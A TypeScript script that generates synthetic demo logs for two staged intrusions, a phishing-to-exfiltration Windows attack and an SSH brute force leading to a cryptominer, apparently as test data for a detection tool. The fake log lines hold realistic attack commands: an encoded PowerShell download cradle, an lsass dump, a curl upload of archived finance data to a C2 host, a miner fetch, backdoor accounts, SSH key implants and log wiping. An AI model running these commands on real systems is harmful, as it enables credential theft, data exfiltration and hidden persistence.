/**
 * Generates realistic demo log sets into samples/. Deterministic (seeded PRNG).
 *   npm run samples
 *
 * Scenario 1 "operation-nightfall": phishing macro -> C2 -> recon -> credential
 *   dumping -> lateral movement across 3 hosts -> backdoor persistence -> data
 *   exfiltration -> log wiping. Spread across 5 log sources with benign noise.
 * Scenario 2 "ssh-cryptominer": Linux SSH brute force -> sudo -> miner + cron.
 */
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

let seed = 1337;
const rnd = () => ((seed = (seed * 1664525 + 1013904223) % 4294967296) / 4294967296);
const pick = <T>(a: T[]) => a[Math.floor(rnd() * a.length)];
const ri = (a: number, b: number) => a + Math.floor(rnd() * (b - a + 1));

const DAY = '2026-10-14';
const t = (hms: string) => Date.parse(`${DAY}T${hms}Z`);
const iso = (ms: number) => new Date(ms).toISOString().replace('.000Z', 'Z');
const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const sys = (ms: number) => {
  const d = new Date(ms);
  return `${MON[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${d.toISOString().slice(11, 19)}`;
};
const clf = (ms: number) => {
  const d = new Date(ms);
  return `${String(d.getUTCDate()).padStart(2, '0')}/${MON[d.getUTCMonth()]}/${d.getUTCFullYear()}:${d.toISOString().slice(11, 19)} +0000`;
};

// ---------------------------------------------------------------------------
// Scenario 1
// ---------------------------------------------------------------------------
const H = {
  acct: { name: 'WS-ACCT-07', ip: '10.10.20.37', user: 'j.alvarez' },
  hr: { name: 'WS-HR-02', ip: '10.10.20.52', user: 'm.chen' },
  fs: { name: 'FS-01', ip: '10.10.10.15' },
  dc: { name: 'DC-01', ip: '10.10.10.5' },
  sql: { name: 'SQL-02', ip: '10.10.10.22' },
};
const benignHosts = [
  { name: 'WS-SALES-11', ip: '10.10.20.61', user: 'r.okafor' },
  { name: 'WS-SALES-14', ip: '10.10.20.64', user: 'l.nguyen' },
  { name: 'WS-IT-01', ip: '10.10.20.10', user: 'a.patel' },
  { name: 'WS-OPS-05', ip: '10.10.20.45', user: 'd.kowalski' },
  H.acct,
  H.hr,
];
const C2 = '185.220.101.47';
const C2_DOMAIN = 'cdn-update-check.net';
const EXFIL_BYTES = 2_412_331_008;

type Row = { ts: number; line: string };
const winsec: Row[] = [];
const sysmon: Row[] = [];
const fw: Row[] = [];
const proxy: Row[] = [];
const mail: Row[] = [];

const csvq = (s: string) => (/[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s);
function sec(ts: number, comp: string, id: number, level: string, acct: string, logonType: string, src: string, msg: string) {
  winsec.push({ ts, line: [iso(ts), comp, id, level, acct, logonType, src, msg].map((x) => csvq(String(x))).join(',') });
}
function sm(ts: number, o: Record<string, unknown>) {
  sysmon.push({ ts, line: JSON.stringify({ '@timestamp': iso(ts), ...o }) });
}
function fwl(ts: number, action: string, src: string, dst: string, dpt: number, bytes: number, extra = '') {
  fw.push({ ts, line: `${sys(ts)} fw01 kernel: ACTION=${action} SRC=${src} DST=${dst} PROTO=TCP SPT=${ri(49152, 65000)} DPT=${dpt} BYTES=${bytes}${extra}` });
}
function px(ts: number, ip: string, user: string, method: string, url: string, code: number, size: number, ua: string) {
  proxy.push({ ts, line: `${ip} - ${user} [${clf(ts)}] "${method} ${url} HTTP/1.1" ${code} ${size} "-" "${ua}"` });
}
function ml(ts: number, s: string) {
  mail.push({ ts, line: `${iso(ts)} mail-gw01 ${s}` });
}

// ---- benign noise across the business day ---------------------------------
const sites = ['https://outlook.office365.com/mail', 'https://teams.microsoft.com/api/chats', 'https://www.google.com/search?q=quarterly+report', 'https://acme-logistics.sharepoint.com/sites/finance', 'https://www.linkedin.com/feed', 'https://update.microsoft.com/v6/', 'https://slack.com/api/rtm.connect', 'https://github.com/acme-logistics', 'https://www.ups.com/track', 'https://news.ycombinator.com/'];
const browserUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36';
const benignProcs = [
  ['C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'C:\\Windows\\explorer.exe'],
  ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\explorer.exe'],
  ['C:\\Windows\\System32\\svchost.exe -k netsvcs -p', 'C:\\Windows\\System32\\services.exe'],
  ['C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', 'C:\\Windows\\explorer.exe'],
  ['C:\\Windows\\System32\\taskhostw.exe', 'C:\\Windows\\System32\\svchost.exe'],
  ['C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background', 'C:\\Windows\\explorer.exe'],
];

// morning logons
for (const h of benignHosts) {
  const ts = t(`07:${ri(40, 59)}:${String(ri(0, 59)).padStart(2, '0')}`) + ri(0, 60 * 60 * 1000 * 0.6);
  sec(ts, h.name, 4624, 'Information', `ACME\\${h.user}`, '2', '-', `An account was successfully logged on. Logon Type 2 (Interactive). Account: ${h.user}`);
}
// a fat-finger failed logon (benign)
sec(t('08:14:03'), 'WS-SALES-14', 4625, 'Information', 'ACME\\l.nguyen', '2', '-', 'An account failed to log on. Failure reason: Unknown user name or bad password.');
sec(t('08:14:21'), 'WS-SALES-14', 4624, 'Information', 'ACME\\l.nguyen', '2', '-', 'An account was successfully logged on. Logon Type 2 (Interactive). Account: l.nguyen');

for (let ts = t('07:45:00'); ts < t('18:30:00'); ts += ri(40, 260) * 1000) {
  const h = pick(benignHosts);
  const kind = rnd();
  if (kind < 0.45) {
    const url = pick(sites);
    px(ts, h.ip, h.user, url.startsWith('https') ? 'CONNECT' : 'GET', url, 200, ri(800, 90000), browserUA);
    fwl(ts + 50, 'ALLOW', h.ip, `${ri(13, 152)}.${ri(1, 250)}.${ri(1, 250)}.${ri(1, 250)}`, 443, ri(900, 120000));
  } else if (kind < 0.75) {
    const [img, parent] = pick(benignProcs);
    sm(ts, { host: h.name, event_id: 1, event: 'ProcessCreate', user: `ACME\\${h.user}`, image: img.split(' ')[0], command_line: `"${img}"`, parent_image: parent });
  } else if (kind < 0.85) {
    sec(ts, pick([H.dc.name, H.fs.name]), 4624, 'Information', `ACME\\${h.user}`, '3', h.ip, `An account was successfully logged on. Logon Type 3 (Network). Account: ${h.user}`);
  } else if (kind < 0.92) {
    fwl(ts, 'ALLOW', h.ip, '10.10.10.5', 53, ri(60, 400));
  } else {
    ml(ts, `ACCEPT from=<${pick(['noreply@ups.com', 'hr@acme-logistics.com', 'it-helpdesk@acme-logistics.com', 'newsletter@freightwaves.com'])}> to=<${h.user}@acme-logistics.com> subject="${pick(['Your shipment is on its way', 'Benefits enrollment reminder', 'Weekly freight digest', 'Ticket #4471 updated'])}" attachment=- verdict=clean`);
  }
}
// nightly backup job on FS-01 (benign, but looks a bit like bulk transfer)
sm(t('01:00:02'), { host: H.fs.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe', command_line: '"VeeamAgent.exe" -job nightly-fs', parent_image: 'C:\\Windows\\System32\\services.exe' });
fwl(t('01:22:40'), 'ALLOW', H.fs.ip, '10.10.30.200', 10006, 18_204_331_920, ' NOTE=backup-appliance');

// ---- the attack ------------------------------------------------------------
// 08:52 phishing email
ml(t('08:52:11'), `ACCEPT from=<invoices@northwind-billing.co> to=<j.alvarez@acme-logistics.com> subject="URGENT: October invoice overdue - final notice" attachment=Invoice_Oct.docm size=88412 spf=softfail verdict=clean`);
// 09:03 macro -> powershell
sm(t('09:03:12'), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', command_line: '"WINWORD.EXE" /n "C:\\Users\\j.alvarez\\Downloads\\Invoice_Oct.docm"', parent_image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE' });
sm(t('09:03:38'), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAG4AZQB0AC8AdQAuAHAAcwAxACcAKQA=', parent_image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE' });
px(t('09:03:41'), H.acct.ip, H.acct.user, 'GET', `http://${C2_DOMAIN}/u.ps1`, 200, 4821, 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.4391');
px(t('09:03:49'), H.acct.ip, H.acct.user, 'GET', `http://${C2_DOMAIN}/static/svchost32.bin`, 200, 412_160, 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.4391');
sm(t('09:03:52'), { host: H.acct.name, event_id: 11, event: 'FileCreate', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', target_filename: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe' });
sm(t('09:03:55'), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe', command_line: '"C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe" --silent', parent_image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', hashes: 'SHA256=9F2C4A1D7B0E33C85A61F0D2E7B9C4A18D3E5F6071829A3B4C5D6E7F8091A2B3' });
sm(t('09:04:01'), { host: H.acct.name, event_id: 13, event: 'RegistryValueSet', user: 'ACME\\j.alvarez', image: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe', target_object: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeUpdate', details: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe --silent' });
// C2 beaconing from ACCT every ~60s
for (let ts = t('09:04:10'); ts < t('17:10:00'); ts += 60_000 + ri(-4000, 4000)) {
  fwl(ts, 'ALLOW', H.acct.ip, C2, 443, ri(1700, 2100));
}
// 10:12 discovery
const disc = [
  ['10:12:04', 'whoami.exe', 'whoami /all'],
  ['10:12:19', 'net.exe', 'net group "Domain Admins" /domain'],
  ['10:12:33', 'nltest.exe', 'nltest /dclist:acme.local'],
  ['10:13:02', 'net.exe', 'net view /all /domain'],
  ['10:14:47', 'nslookup.exe', 'nslookup -type=srv _ldap._tcp.dc._msdcs.acme.local'],
];
for (const [hms, exe, cmd] of disc) {
  sm(t(hms), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: `C:\\Windows\\System32\\${exe}`, command_line: cmd, parent_image: 'C:\\Windows\\System32\\cmd.exe' });
}
// 11:30 internal port scan
for (let i = 0; i < 120; i++) {
  const ts = t('11:30:00') + i * 700;
  const host = `10.10.10.${ri(1, 40)}`;
  fwl(ts, rnd() < 0.85 ? 'DROP' : 'ALLOW', H.acct.ip, host, pick([445, 3389, 135, 5985]), 60);
}
// 13:47 credential dumping
sm(t('13:47:21'), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\rundll32.exe', command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full', parent_image: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe', integrity_level: 'High' });
sm(t('13:47:22'), { host: H.acct.name, event_id: 10, event: 'ProcessAccess', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\rundll32.exe', target_image: 'C:\\Windows\\System32\\lsass.exe', granted_access: '0x1FFFFF' });
sm(t('13:47:25'), { host: H.acct.name, event_id: 11, event: 'FileCreate', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\rundll32.exe', target_filename: 'C:\\Users\\Public\\lsass.dmp' });
// 14:02 lateral movement ACCT -> HR via PsExec with stolen svc_backup creds
sec(t('14:02:07'), H.hr.name, 4648, 'Information', 'ACME\\j.alvarez', '-', H.acct.ip, 'A logon was attempted using explicit credentials. Target account: ACME\\svc_backup. Target server: WS-HR-02');
sec(t('14:02:09'), H.hr.name, 4624, 'Information', 'ACME\\svc_backup', '3', H.acct.ip, 'An account was successfully logged on. Logon Type 3 (Network). Account: svc_backup. Source Network Address: 10.10.20.37');
sec(t('14:02:11'), H.hr.name, 7045, 'Information', 'ACME\\svc_backup', '-', '-', 'A service was installed in the system. Service Name: PSEXESVC. Service File Name: %SystemRoot%\\PSEXESVC.exe');
fwl(t('14:02:08'), 'ALLOW', H.acct.ip, H.hr.ip, 445, 184_221);
sm(t('14:02:15'), { host: H.hr.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\Windows\\PSEXESVC.exe', command_line: 'C:\\Windows\\PSEXESVC.exe', parent_image: 'C:\\Windows\\System32\\services.exe' });
sm(t('14:05:40'), { host: H.hr.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\ProgramData\\Microsoft\\svchost32.exe', command_line: '"C:\\ProgramData\\Microsoft\\svchost32.exe" --silent', parent_image: 'C:\\Windows\\PSEXESVC.exe', hashes: 'SHA256=9F2C4A1D7B0E33C85A61F0D2E7B9C4A18D3E5F6071829A3B4C5D6E7F8091A2B3' });
for (let ts = t('14:06:00'); ts < t('17:10:00'); ts += 60_000 + ri(-4000, 4000)) fwl(ts, 'ALLOW', H.hr.ip, C2, 443, ri(1700, 2100));
// 15:10 RDP HR -> FS-01
sec(t('15:10:31'), H.fs.name, 4624, 'Information', 'ACME\\svc_backup', '10', H.hr.ip, 'An account was successfully logged on. Logon Type 10 (RemoteInteractive). Account: svc_backup. Source Network Address: 10.10.20.52');
fwl(t('15:10:29'), 'ALLOW', H.hr.ip, H.fs.ip, 3389, 2_884_112);
sm(t('15:12:02'), { host: H.fs.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\Windows\\System32\\cmd.exe', command_line: 'cmd.exe /c dir \\\\FS-01\\Finance /s /b > C:\\ProgramData\\f.txt', parent_image: 'C:\\Windows\\explorer.exe' });
sm(t('15:22:48'), { host: H.fs.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\ProgramData\\7z\\7z.exe', command_line: '7z.exe a -mx1 -pInf1ltr8! C:\\ProgramData\\upd_cache.7z D:\\Shares\\Finance\\ D:\\Shares\\HR\\Payroll\\', parent_image: 'C:\\Windows\\System32\\cmd.exe' });
// 16:04 persistence/backdoor on FS-01
sm(t('16:03:58'), { host: H.fs.name, event_id: 11, event: 'FileCreate', user: 'ACME\\svc_backup', image: 'C:\\Windows\\System32\\cmd.exe', target_filename: 'C:\\ProgramData\\wuhelper.exe' });
sec(t('16:04:12'), H.fs.name, 7045, 'Information', 'ACME\\svc_backup', '-', '-', 'A service was installed in the system. Service Name: WindowsUpdateHelper. Service File Name: C:\\ProgramData\\wuhelper.exe. Service Start Type: auto start. Account: LocalSystem');
sec(t('16:04:40'), H.fs.name, 4698, 'Information', 'ACME\\svc_backup', '-', '-', 'A scheduled task was created. Task Name: \\Microsoft\\Windows\\UpdateOrchestrator\\RefreshCache. Action: C:\\ProgramData\\wuhelper.exe -k. Trigger: every 30 minutes');
sec(t('16:05:09'), H.fs.name, 4720, 'Information', 'ACME\\svc_backup', '-', '-', 'A user account was created. New Account: support_adm');
sec(t('16:05:14'), H.fs.name, 4732, 'Information', 'ACME\\svc_backup', '-', '-', 'A member was added to a security-enabled local group. Member: support_adm. Group: Administrators');
for (let ts = t('16:06:00'); ts < t('18:30:00'); ts += 30 * 60_000) fwl(ts, 'ALLOW', H.fs.ip, C2, 8443, ri(1200, 1600));
// 16:20 exfiltration
sm(t('16:19:55'), { host: H.fs.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\svc_backup', image: 'C:\\Windows\\System32\\curl.exe', command_line: `curl.exe -k -T C:\\ProgramData\\upd_cache.7z https://${C2_DOMAIN}/upload`, parent_image: 'C:\\Windows\\System32\\cmd.exe' });
fwl(t('16:20:02'), 'ALLOW', H.fs.ip, C2, 443, EXFIL_BYTES, ' DURATION=1312s');
px(t('16:20:01'), H.fs.ip, 'svc_backup', 'PUT', `https://${C2_DOMAIN}/upload`, 201, EXFIL_BYTES, 'curl/8.4.0');
// 16:45 cover tracks on ACCT
sm(t('16:45:30'), { host: H.acct.name, event_id: 1, event: 'ProcessCreate', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\wevtutil.exe', command_line: 'wevtutil.exe cl Security', parent_image: 'C:\\Users\\j.alvarez\\AppData\\Roaming\\Microsoft\\svchost32.exe' });
sec(t('16:45:31'), H.acct.name, 1102, 'Warning', 'ACME\\j.alvarez', '-', '-', 'The audit log was cleared. Subject: j.alvarez');
sm(t('16:46:02'), { host: H.acct.name, event_id: 23, event: 'FileDelete', user: 'ACME\\j.alvarez', image: 'C:\\Windows\\System32\\cmd.exe', target_filename: 'C:\\Users\\Public\\lsass.dmp' });

// ---- DHCP / DNS server log (lets the engine map IPs -> hostnames) ----------
const dns: Row[] = [];
const dn = (ts: number, s: string) => dns.push({ ts, line: `${iso(ts)} DC-01 ${s}` });
for (const h of [H.fs, H.dc, H.sql]) dn(t('06:00:00') + ri(0, 9000), `DNS: dynamic update A ${h.name}.acme.local ${h.ip}`);
for (const h of benignHosts) dn(t('07:30:00') + ri(0, 600_000), `DHCP: ASSIGN ${h.ip} to ${h.name}.acme.local lease=8h`);
for (let ts = t('07:45:00'); ts < t('18:00:00'); ts += ri(60, 400) * 1000) {
  const h = pick(benignHosts);
  dn(ts, `DNS: query from ${h.ip} A ${pick(['outlook.office365.com', 'teams.microsoft.com', 'www.google.com', 'acme-logistics.sharepoint.com', 'slack.com', 'github.com'])} NOERROR`);
}
dn(t('09:03:40'), `DNS: query from ${H.acct.ip} A ${C2_DOMAIN} NOERROR -> ${C2}`);
dn(t('14:05:44'), `DNS: query from ${H.hr.ip} A ${C2_DOMAIN} NOERROR -> ${C2}`);
dn(t('16:19:57'), `DNS: query from ${H.fs.ip} A ${C2_DOMAIN} NOERROR -> ${C2}`);

// ---- write ------------------------------------------------------------------
const out1 = join(import.meta.dirname, '..', 'samples', 'operation-nightfall');
mkdirSync(out1, { recursive: true });
const dump = (rows: Row[], header = '') => (header ? header + '\n' : '') + rows.sort((a, b) => a.ts - b.ts).map((r) => r.line).join('\n') + '\n';
writeFileSync(join(out1, 'windows_security.csv'), dump(winsec, 'TimeCreated,Computer,EventID,Level,Account,LogonType,SourceIP,Message'));
writeFileSync(join(out1, 'sysmon.jsonl'), dump(sysmon));
writeFileSync(join(out1, 'firewall.log'), dump(fw));
writeFileSync(join(out1, 'proxy_access.log'), dump(proxy));
writeFileSync(join(out1, 'mail_gateway.txt'), dump(mail));
writeFileSync(join(out1, 'dns_dhcp.log'), dump(dns));

// ---------------------------------------------------------------------------
// Scenario 2: ssh brute force -> cryptominer (single Linux box)
// ---------------------------------------------------------------------------
seed = 4242;
const D2 = '2026-10-21';
const t2 = (hms: string) => Date.parse(`${D2}T${hms}Z`);
const auth: Row[] = [];
const syslog: Row[] = [];
const A = (ts: number, s: string) => auth.push({ ts, line: `${sys(ts)} web-01 ${s}` });
const S = (ts: number, s: string) => syslog.push({ ts, line: `${sys(ts)} web-01 ${s}` });
const ATK = '45.155.205.233';
for (let ts = t2('00:00:00'); ts < t2('06:00:00'); ts += ri(300, 1500) * 1000) {
  if (rnd() < 0.5) S(ts, `CRON[${ri(2000, 9000)}]: (root) CMD (/usr/lib/php/sessionclean)`);
  else S(ts, `nginx[1022]: 10.0.${ri(0, 3)}.${ri(2, 250)} - - "GET /${pick(['', 'api/health', 'products', 'cart', 'static/app.js'])} HTTP/1.1" 200 ${ri(300, 9000)}`);
}
const users = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy', 'git', 'user'];
let ts2 = t2('02:14:03');
for (let i = 0; i < 340; i++) {
  ts2 += ri(300, 2200);
  const u = pick(users);
  A(ts2, `sshd[${ri(30000, 39999)}]: Failed password for ${u === 'root' ? '' : 'invalid user '}${u} from ${ATK} port ${ri(30000, 60000)} ssh2`);
}
A(t2('02:31:44'), `sshd[38812]: Accepted password for deploy from ${ATK} port 51122 ssh2`);
A(t2('02:31:44'), 'sshd[38812]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)');
A(t2('02:33:10'), 'sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash');
S(t2('02:34:02'), 'bash[38901]: root: wget -q http://91.92.249.13/x/kdevtmpfsi -O /tmp/.x/kdevtmpfsi && chmod +x /tmp/.x/kdevtmpfsi');
S(t2('02:34:20'), 'kernel: [884213.22] audit: type=EXECVE argc=4 a0="/tmp/.x/kdevtmpfsi" a1="-o" a2="pool.supportxmr.com:3333" a3="--donate-level=0"');
A(t2('02:35:01'), 'crontab[38977]: (root) REPLACE (root)');
S(t2('02:35:01'), 'bash[38901]: root: (crontab -l; echo "*/5 * * * * /tmp/.x/kdevtmpfsi >/dev/null 2>&1") | crontab -');
A(t2('02:35:40'), 'useradd[38990]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash');
S(t2('02:36:12'), 'bash[38901]: root: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 attacker@kali" >> /root/.ssh/authorized_keys');
S(t2('02:36:50'), 'bash[38901]: root: history -c && rm -f /var/log/wtmp');
for (let ts = t2('02:40:00'); ts < t2('06:00:00'); ts += 10 * 60_000) {
  S(ts, `monitor[811]: ALERT cpu_usage=${ri(96, 100)}% load_avg=${(7 + rnd() * 1.5).toFixed(2)} top_process=kdevtmpfsi`);
  S(ts + 2000, `kernel: [${ri(884300, 899000)}.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP`);
}
const out2 = join(import.meta.dirname, '..', 'samples', 'ssh-cryptominer');
mkdirSync(out2, { recursive: true });
writeFileSync(join(out2, 'auth.log'), dump(auth));
writeFileSync(join(out2, 'syslog'), dump(syslog));

console.log('samples written:', { winsec: winsec.length, sysmon: sysmon.length, fw: fw.length, proxy: proxy.length, mail: mail.length, auth: auth.length, syslog: syslog.length });
